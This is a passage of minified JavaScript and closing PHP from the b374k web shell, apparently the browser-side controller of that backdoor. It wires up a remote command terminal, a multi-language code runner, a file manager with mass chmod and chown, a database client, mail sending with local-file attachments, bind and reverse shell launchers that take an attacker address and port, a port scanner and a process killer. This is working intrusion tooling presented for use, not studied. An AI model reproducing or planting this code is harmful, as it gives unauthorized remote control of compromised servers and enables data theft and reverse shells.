onclick=\"mass_act_go('"+type+"');\">"+title+"</span></td></tr></table>";show_box(ucfirst(title),content)}}$('.cBoxSelected').removeClass('cBoxSelected');xpl_update_status()}function mass_act_go_tar(){mass_act_go('tar')}function mass_act_go_targz(){mass_act_go('targz')}function mass_act_go_zip(){mass_act_go('zip')}function mass_act_go_untar(){mass_act_go('untar')}function mass_act_go_untargz(){mass_act_go('untargz')}function mass_act_go_unzip(){mass_act_go('unzip')}function mass_act_go_paste(){mass_act_go('paste')}function mass_act_go_chmod(){mass_act_go('chmod')}function mass_act_go_chown(){mass_act_go('chown')}function mass_act_go_touch(){mass_act_go('touch')}function mass_act_go(massType){massBuffer=$.trim($('.massBuffer').val());massPath=get_cwd();massValue='';if(massType=='paste'){bufferLength=localStorage.getItem('bufferLength');bufferAction=localStorage.getItem('bufferAction');if(bufferLength>0){massBuffer='';for(var i=0;i<bufferLength;i++){if((buff=localStorage.getItem('buffer_'+i))){massBuffer+=buff+'\n'}}massBuffer=$.trim(massBuffer);if(bufferAction=='copy')massType='copy';else if(bufferAction=='cut')massType='cut'}}else if((massType=='chmod')||(massType=='chown')||(massType=='touch')){massValue=$('.massValue').val()}else if((massType=='tar')||(massType=='targz')||(massType=='zip')){massValue=$('.massValue').val()}else if((massType=='untar')||(massType=='untargz')||(massType=='unzip')){massValue=$('.massValue').val()}if(massBuffer!=''){send_post({massType:massType,massBuffer:massBuffer,massPath:massPath,massValue:massValue},function(res){if(res!='error'){$('.boxresult').html(res+' Operation(s) succeeded')}else $('.boxresult').html('Operation(s) failed');navigate(get_cwd())})}}function xpl_update_status(){totalSelected=$('#xplTable').find('.cBoxSelected').not('.cBoxAll').length;if(totalSelected==0)$('.xplSelected').html('');else $('.xplSelected').html(', '+totalSelected+' item(s) selected')}function xpl_bind(){$('.navigate').off('click');$('.navigate').on('click',function(e){path=xpl_href($(this));navigate(path);hide_box()});$('.navbar').off('click');$('.navbar').on('click',function(e){path=$(this).attr('data-path');navigate(path);hide_box()});$('.newfolder').off('click');$('.newfolder').on('click',function(e){path=html_safe(xpl_href($(this)));newfolder(path)});$('.newfile').off('click');$('.newfile').on('click',function(e){path=html_safe(xpl_href($(this)));newfile(path)});$('.del').off('click');$('.del').on('click',function(e){path=html_safe(xpl_href($(this)));del(path)});$('.view').off('click');$('.view').on('click',function(e){path=xpl_href($(this));view(path,'auto');hide_box()});$('.hex').off('click');$('.hex').on('click',function(e){path=xpl_href($(this));view(path,'hex')});$('#viewFullsize').off('click');$('#viewFullsize').on('click',function(e){src=$('#viewImage').attr('src');window.open(src)});$('.edit').off('click');$('.edit').on('click',function(e){path=xpl_href($(this));view(path,'edit');hide_box()});$('.ren').off('click');$('.ren').on('click',function(e){path=html_safe(xpl_href($(this)));ren(path)});$('.action').off('click');$('.action').on('click',function(e){path=html_safe(xpl_href($(this)));action(path,'file')});$('.actionfolder').off('click');$('.actionfolder').on('click',function(e){path=html_safe(xpl_href($(this)));action(path,'dir')});$('.actiondot').off('click');$('.actiondot').on('click',function(e){path=html_safe(xpl_href($(this)));action(path,'dot')});$('.dl').off('click');$('.dl').on('click',function(e){path=html_safe(xpl_href($(this)));$('#form').append("<input type='hidden' name='download' value='"+path+"'>");$('#form').submit();$('#form').html('');hide_box()});$('.ul').off('click');$('.ul').on('click',function(e){path=xpl_href($(this));navigate(path,false);path=html_safe(path);ul(path);hide_box()});$('.find').off('click');$('.find').on('click',function(e){path=xpl_href($(this));navigate(path,false);path=html_safe(path);find(path);hide_box()});$('#massAction').off('click');$('#massAction').on('change',function(e){type=$('#massAction').val();mass_act(type);$('#massAction').val('Action')});cbox_bind('xplTable','xpl_update_status')}function xpl_href(el){return el.parent().parent().attr('data-path')}function multimedia(path){var a=$('video').get(0);send_post({multimedia:path},function(res){a.src=res});hide_box()}$('#terminalInput').on('keydown',function(e){if(e.keyCode==13){cmd=$('#terminalInput').val();terminalHistory.push(cmd);terminalHistoryPos=terminalHistory.length;if(cmd=='clear'||cmd=='cls'){$('#terminalOutput').html('')}else if((path=cmd.match(/cd(.*)/i))||(path=cmd.match(/^([a-z]:)$/i))){path=$.trim(path[1]);navigate(path)}else if(cmd!=''){send_post({terminalInput:cmd},function(res){cwd=html_safe(get_cwd());res='<span class=\'strong\'>'+cwd+'&gt;</span>'+html_safe(cmd)+'\n'+res+'\n';$('#terminalOutput').append(res);bottom=$(document).height()-$(window).height();$(window).scrollTop(bottom)})}$('#terminalInput').val('');setTimeout("$('#terminalInput').focus()",100)}else if(e.keyCode==38){if(terminalHistoryPos>0){terminalHistoryPos--;$('#terminalInput').val(terminalHistory[terminalHistoryPos]);if(terminalHistoryPos<0)terminalHistoryPos=0}}else if(e.keyCode==40){if(terminalHistoryPos<terminalHistory.length-1){terminalHistoryPos++;$('#terminalInput').val(terminalHistory[terminalHistoryPos]);if(terminalHistoryPos>terminalHistory.length)terminalHistoryPos=terminalHistory.length}}fix_tabchar(this,e)});function eval_go(){evalType=$('#evalType').val();evalInput=$('#evalInput').val();evalOptions=$('#evalOptions').val();evalArguments=$('#evalArguments').val();if(evalOptions=='Options/Switches')evalOptions='';if(evalArguments=='Arguments')evalArguments='';if($.trim(evalInput)!=''){send_post({evalInput:evalInput,evalType:evalType,evalOptions:evalOptions,evalArguments:evalArguments},function(res){if(res!='error'){splits=res.split('{[|b374k|]}');if(splits.length==2){output=splits[0]+"<hr>"+splits[1];$('#evalOutput').html(output)}else{$('#evalOutput').html(res)}}})}}function eval_init(){if((evalSupported=localStorage.getItem('evalSupported'))){eval_bind();output("eval : "+evalSupported);evalReady=true}else{send_post({evalGetSupported:"evalGetSupported"},function(res){evalReady=true;if(res!="error"){localStorage.setItem('evalSupported',res);evalSupported=res;eval_bind();output("eval : "+evalSupported)}})}}function eval_bind(){if((evalSupported!=null)&&(evalSupported!='')){splits=evalSupported.split(",");$.each(splits,function(i,k){$('#evalType').append("<option>"+k+"</option>")})}$('#evalType').on('change',function(e){if($('#evalType').val()=='php'){$('#evalAdditional').hide()}else{$('#evalAdditional').show()}});$('#evalOptions').on('focus',function(e){options=$('#evalOptions');if(options.val()=='Options/Switches')options.val('')});$('#evalOptions').on('blur',function(e){options=$('#evalOptions');if($.trim(options.val())=='')options.val('Options/Switches')});$('#evalArguments').on('focus',function(e){args=$('#evalArguments');if(args.val()=='Arguments')args.val('')});$('#evalArguments').on('blur',function(e){args=$('#evalArguments');if($.trim(args.val())=='')args.val('Arguments')});$('#evalInput').on('keydown',function(e){if(e.ctrlKey&&(e.keyCode==10||e.keyCode==13)){eval_go()}fix_tabchar(this,e)})}Zepto(function($){$('#decodeStr').on('keydown',function(e){if(e.ctrlKey&&(e.keyCode==10||e.keyCode==13)){decode_go()}fix_tabchar(this,e)})});function decode_go(){decodeStr=$('#decodeStr').val();send_post({decodeStr:decodeStr},function(res){if(res!='error'){$('#decodeResult').html('');$('#decodeResult').html(res)}})}Zepto(function($){db_init()});var dbSupported="";var dbPageLimit=50;function db_init(){if((dbSupported=localStorage.getItem('db_supported'))){db_bind();output("db : "+dbSupported);db_add_supported()}else{send_post({dbGetSupported:""},function(res){if(res!="error"){localStorage.setItem('dbSupported',res);dbSupported=res;db_bind();output("db : "+dbSupported);db_add_supported()}})}}function db_add_supported(){splits=dbSupported.split(",");$.each(splits,function(i,k){$('#dbType').append("<option>"+k+"</option>")})}function db_bind(){$('#dbType').on('change',function(e){type=$('#dbType').val();if((type=='odbc')||(type=='pdo')){$('.dbHostLbl').html('DSN / Connection String');$('.dbUserRow').show();$('.dbPassRow').show();$('.dbPortRow').hide()}else if((type=='sqlite')||(type=='sqlite3')){$('.dbHostLbl').html('DB File');$('.dbUserRow').hide();$('.dbPassRow').hide();$('.dbPortRow').hide()}else{$('.dbHostLbl').html('Host');$('.dbUserRow').show();$('.dbPassRow').show();$('.dbPortRow').show()}});$('#dbQuery').on('focus',function(e){if($('#dbQuery').val()=='You can also press ctrl+enter to submit'){$('#dbQuery').val('')}});$('#dbQuery').on('blur',function(e){if($('#dbQuery').val()==''){$('#dbQuery').val('You can also press ctrl+enter to submit')}});$('#dbQuery').on('keydown',function(e){if(e.ctrlKey&&(e.keyCode==10||e.keyCode==13)){db_run()}})}function db_nav_bind(){dbType=$('#dbType').val();$('.boxNav').off('click');$('.boxNav').on('click',function(){$(this).next().toggle()});$('.dbTable').off('click');$('.dbTable').on('click',function(){type=$('#dbType').val();table=$(this).html();db=$(this).parent().parent().parent().prev().html();db_query_tbl(type,db,table,0,dbPageLimit)})}function db_connect(){dbType=$('#dbType').val();dbHost=$('#dbHost').val();dbUser=$('#dbUser').val();dbPass=$('#dbPass').val();dbPort=$('#dbPort').val();send_post({dbType:dbType,dbHost:dbHost,dbUser:dbUser,dbPass:dbPass,dbPort:dbPort},function(res){if(res!='error'){$('#dbNav').html(res);$('.dbHostRow').hide();$('.dbUserRow').hide();$('.dbPassRow').hide();$('.dbPortRow').hide();$('.dbConnectRow').hide();$('.dbQueryRow').show();$('#dbBottom').show();db_nav_bind()}else $('.dbError').html('Unable to connect')})}function db_disconnect(){$('.dbHostRow').show();$('.dbUserRow').show();$('.dbPassRow').show();$('.dbPortRow').show();$('.dbConnectRow').show();$('.dbQueryRow').hide();$('#dbNav').html('');$('#dbResult').html('');$('#dbBottom').hide()}function db_run(){dbType=$('#dbType').val();dbHost=$('#dbHost').val();dbUser=$('#dbUser').val();dbPass=$('#dbPass').val();dbPort=$('#dbPort').val();dbQuery=$('#dbQuery').val();if((dbQuery!='')&&(dbQuery!='You can also press ctrl+enter to submit')){send_post({dbType:dbType,dbHost:dbHost,dbUser:dbUser,dbPass:dbPass,dbPort:dbPort,dbQuery:dbQuery},function(res){if(res!='error'){$('#dbResult').html(res);$('.tblResult').each(function(){sorttable.k(this)})}})}}function db_query_tbl(type,db,table,start,limit){dbType=$('#dbType').val();dbHost=$('#dbHost').val();dbUser=$('#dbUser').val();dbPass=$('#dbPass').val();dbPort=$('#dbPort').val();send_post({dbType:dbType,dbHost:dbHost,dbUser:dbUser,dbPass:dbPass,dbPort:dbPort,dbQuery:'',dbDB:db,dbTable:table,dbStart:start,dbLimit:limit},function(res){if(res!='error'){$('#dbResult').html(res);$('.tblResult').each(function(){sorttable.k(this)})}})}function db_pagination(type){db=$('#dbDB').val();table=$('#dbTable').val();start=parseInt($('#dbStart').val());limit=parseInt($('#dbLimit').val());dbType=$('#dbType').val();if(type=='next'){start=start+limit}else if(type=='prev'){start=start-limit;if(start<0)start=0}db_query_tbl(dbType,db,table,start,limit)}Zepto(function($){info_init()});function info_init(){if((infoResult=localStorage.getItem('infoResult'))){$('.infoResult').html(infoResult)}else{info_refresh()}}function info_toggle(id){$('#'+id).toggle()}function info_refresh(){send_post({infoRefresh:'infoRefresh'},function(res){$('.infoResult').html(res);localStorage.setItem('infoResult',res)})}Zepto(function($){});function mail_send(){mailFrom=$.trim($('#mailFrom').val());mailTo=$.trim($('#mailTo').val());mailSubject=$.trim($('#mailSubject').val());mailContent=$('#mailContent').val();mailAttachment='';if($('.mailAttachment')){mailAttachment=$('.mailAttachment').map(function(){return this.value}).get().join('{[|b374k|]}')}send_post({mailFrom:mailFrom,mailTo:mailTo,mailSubject:mailSubject,mailContent:mailContent,mailAttachment:mailAttachment},function(res){$('#mailResult').html(res)})}function mail_attach(){content="<tr><td>Local file <a onclick=\"$(this).parent().parent().remove();\">(-)</a></td><td colspan='2'><input type='text' class='mailAttachment' value=''></td></tr>";$('#mailTBody').append(content)}Zepto(function($){rs_init()});function rs_init(){if(evalReady&&(evalSupported!=null)&&(evalSupported!='')){splits=evalSupported.split(",");$.each(splits,function(i,k){$('.rsType').append("<option>"+k+"</option>")})}else setTimeout('rs_init()',1000);$('#packetContent').on('keydown',function(e){if(e.ctrlKey&&(e.keyCode==10||e.keyCode==13)){packet_go()}fix_tabchar(this,e)})}function rs_go_bind(){rs_go('bind')}function rs_go_back(){rs_go('back')}function rs_go(rsType){rsArgs="";if(rsType=='bind'){rsPort=parseInt($('#bindPort').val());rsLang=$('#bindLang').val();rsArgs=rsPort;rsResult=$('#bindResult')}else if(rsType=='back'){rsAddr=$('#backAddr').val();rsPort=parseInt($('#backPort').val());rsLang=$('#backLang').val();rsArgs=rsPort+' '+rsAddr;rsResult=$('#backResult')}if((isNaN(rsPort))||(rsPort<=0)||(rsPort>65535)){rsResult.html('Invalid port');return}if(rsArgs!=''){send_post({rsLang:rsLang,rsArgs:rsArgs},function(res){if(res!='error'){splits=res.split('{[|b374k|]}');if(splits.length==2){output=splits[0]+"<hr>"+splits[1];rsResult.html(output)}else{rsResult.html(res)}}})}}function packet_go(){packetHost=$('#packetHost').val();packetStartPort=parseInt($('#packetStartPort').val());packetEndPort=parseInt($('#packetEndPort').val());packetTimeout=parseInt($('#packetTimeout').val());packetSTimeout=parseInt($('#packetSTimeout').val());packetContent=$('#packetContent').val();packetResult=$('#packetResult');packetStatus=$('#packetStatus');if((isNaN(packetStartPort))||(packetStartPort<=0)||(packetStartPort>65535)){packetResult.html('Invalid start port');return}if((isNaN(packetEndPort))||(packetEndPort<=0)||(packetEndPort>65535)){packetResult.html('Invalid end port');return}if((isNaN(packetTimeout))||(packetTimeout<=0)){packetResult.html('Invalid connection timeout');return}if((isNaN(packetSTimeout))||(packetSTimeout<=0)){packetResult.html('Invalid stream timeout');return}if(packetStartPort>packetEndPort){start=packetEndPort;end=packetStartPort}else{start=packetStartPort;end=packetEndPort}packetResult.html('');while(start<=end){packetPort=start++;packetResult.append("<hr><div><p class='boxtitle'>Host : "+html_safe(packetHost)+":"+packetPort+"</p><br><div id='packet"+packetPort+"' style='padding:2px 4px;'>Working... please wait...</div></div>");packet_send(packetHost,packetPort,packetEndPort,packetTimeout,packetSTimeout,packetContent)}}function packet_send(packetHost,packetPort,packetEndPort,packetTimeout,packetSTimeout,packetContent){send_post({packetHost:packetHost,packetPort:packetPort,packetEndPort:packetEndPort,packetTimeout:packetTimeout,packetSTimeout:packetSTimeout,packetContent:packetContent},function(res){$('#packet'+packetPort).html(res)},false)}Zepto(function($){show_processes()});function show_processes(){send_post({showProcesses:''},function(res){if(res!='error'){$('#processes').html(res);sorttable.k($('#psTable').get(0));ps_bind()}})}function ps_bind(){$('.kill').off('click');$('.kill').on('click',function(e){kill_pid(ps_get_pid($(this)))});cbox_bind('psTable','ps_update_status')}function ps_get_pid(el){return el.parent().parent().attr('data-pid')}function ps_update_status(){totalSelected=$('#psTable').find('.cBoxSelected').not('.cBoxAll').length;if(totalSelected==0)$('.psSelected').html('');else $('.psSelected').html(' ( '+totalSelected+' item(s) selected )')}function kill_selected(){buffer=get_all_cbox_selected('psTable','ps_get_pid');allPid='';$.each(buffer,function(i,v){allPid+=v+' '});allPid=$.trim(allPid);kill_pid(allPid)}function kill_pid(allPid){title='Kill';content="<table class='boxtbl'><tr><td colspan='2'><textarea class='allPid' style='height:120px;min-height:120px;' disabled>"+allPid+"</textarea></td></tr><tr><td colspan='2'><span class='button' onclick=\"kill_pid_go();\">kill</span></td></tr></table>";show_box(title,content)}function kill_pid_go(){allPid=$('.allPid').val();if($.trim(allPid)!=''){send_post({allPid:allPid},function(res){if(res!='error'){$('.boxresult').html(res+' process(es) killed')}else $('.boxresult').html('Unable to kill process(es)');show_processes()})}}<?php
foreach($GLOBALS['module_to_load'] as $k){
echo "function ".$GLOBALS['module'][$k]['id']."(){ ".$GLOBALS['module'][$k]['js_ontabselected']." }\n";}?>
</script>
<!--script end-->
</body>
</html><?php die();?>

<?php
	}	
?> 

<?php 
	endif
?>
